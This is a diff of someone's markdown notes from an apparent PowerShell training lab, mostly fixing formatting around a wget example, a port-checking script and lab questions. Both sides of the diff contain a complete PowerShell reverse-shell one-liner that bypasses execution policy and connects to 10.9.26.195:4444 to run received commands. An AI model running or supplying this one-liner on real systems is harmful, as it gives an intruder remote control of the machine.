@@ -17,9 +17,9 @@
 
 `wget http://blog.stackexchange.com/ -OutFile out.html`
 
-** Powershell Reverse Shell **
+**Powershell Reverse Shell**
 
-> `powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.26.195',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+> powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.26.195',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 
 ## 1/6 Objectives
@@ -192,8 +192,7 @@ Now we get into scripting.
 
 Additional reading: [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)
 
-`
-$system_ports = Get-NetTCPConnection -State Listen
+`$system_ports = Get-NetTCPConnection -State Listen
 
 $text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt
 
@@ -207,10 +206,9 @@ foreach($port in $text_port){
     }
 
     
-}
-`
+}`
 
-** I answered the questions with the one-liner.  Defeating the purpose of this exercise.  I'm going to stop here for today and work on powershell scripting the answers **
+**I answered the questions with the one-liner.  Defeating the purpose of this exercise.  I'm going to stop here for today and work on powershell scripting the answers**
 
 **Q1.** What file contains the password?
 
